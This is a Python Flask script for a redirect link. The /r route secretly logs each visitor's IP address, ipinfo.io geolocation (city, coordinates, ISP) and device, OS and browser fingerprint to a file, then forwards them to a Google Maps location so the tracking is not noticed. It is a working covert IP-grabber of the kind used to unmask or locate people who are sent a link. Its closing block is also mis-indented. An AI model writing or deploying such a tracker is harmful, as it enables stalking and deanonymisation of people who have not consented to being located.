from flask import Flask, request, redirect
from datetime import datetime
from user_agents import parse as ua_parse
import requests
import json

app = Flask(__name__)

import os
IPINFO_TOKEN = os.getenv("IPINFO_TOKEN", "")
LOG_FILE = "/var/log/flask_geo_redirect.jsonl"

def geolocate(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}", timeout=2)
        if r.status_code == 200:
            data = r.json()
            return {
                "city": data.get("city"),
                "region": data.get("region"),
                "country": data.get("country"),
                "loc": data.get("loc"),
                "org": data.get("org")
            }
    except Exception as e:
        print(f"[geo error] {e}")
    return {}

@app.route("/r")
def redirector():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = ua_parse(request.headers.get("User-Agent", ""))

    log_entry = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "ip": ip,
        "geo": geolocate(ip),
        "user_agent": request.headers.get("User-Agent", ""),
        "device": {
            "family": ua.device.family,
            "brand": ua.device.brand,
            "model": ua.device.model
        },
        "os": ua.os.family + " " + ua.os.version_string,
        "browser": ua.browser.family + " " + ua.browser.version_string
    }

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")

    return redirect("https://www.google.com/maps?q=46.4686355,30.7635889", code=302)

if __name__ == "__main__":
    import os

port = int(os.environ.get("PORT", 5000))
app.run(host="0.0.0.0", port=port)

